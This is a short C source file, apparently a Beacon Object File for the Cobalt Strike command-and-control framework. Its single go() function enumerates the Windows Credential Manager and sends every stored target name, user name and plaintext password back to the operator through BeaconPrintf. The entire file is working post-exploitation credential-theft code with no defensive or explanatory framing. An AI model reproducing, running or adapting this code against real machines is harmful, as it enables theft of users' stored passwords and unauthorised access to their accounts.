#include <stdio.h>
#include <windows.h>
#include <wincred.h>
#include "beacon.h"
#include "bofdefs.h"

void go() {
    DWORD count;
    PCREDENTIALW * creds;

    if (!Advapi32$CredEnumerateW(NULL, 0, &count, &creds)) {
        if (Kernel32$GetLastError() == 1168) {
            BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Credential Manager empty.");
            return;
        } else {
            BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Could not enumerate credentials. Error code: %d\n", Kernel32$GetLastError());
            return;
        }
    }

    BeaconPrintf(CALLBACK_OUTPUT,"[CREDENTIALS] Found %d credentials:\n", count);
    for (DWORD i = 0; i < count; i++) {
        BeaconPrintf(CALLBACK_OUTPUT,"  Target Name: %ls\n", creds[i]->TargetName ? creds[i]->TargetName : L"[None]");
        BeaconPrintf(CALLBACK_OUTPUT,"  User Name: %ls\n", creds[i]->UserName ? creds[i]->UserName : L"[None]");
        BeaconPrintf(CALLBACK_OUTPUT,"  Password: %.*ls\n", (creds[i]->CredentialBlobSize / sizeof(wchar_t)), (wchar_t *) creds[i]->CredentialBlob);
        BeaconPrintf(CALLBACK_OUTPUT,"\n");
    }
    if (creds) {
        Advapi32$CredFree(creds);
    }
}
